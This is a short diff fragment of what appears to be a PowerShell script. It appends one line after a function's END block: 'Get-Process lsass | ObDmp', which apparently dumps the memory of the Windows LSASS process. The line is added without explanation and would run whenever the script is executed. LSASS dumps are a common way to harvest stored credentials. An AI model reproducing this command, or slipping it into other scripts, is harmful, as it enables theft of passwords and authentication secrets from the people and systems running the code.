@@ -88,3 +88,5 @@
 
     END {}
 }
+
+Get-Process lsass | ObDmp
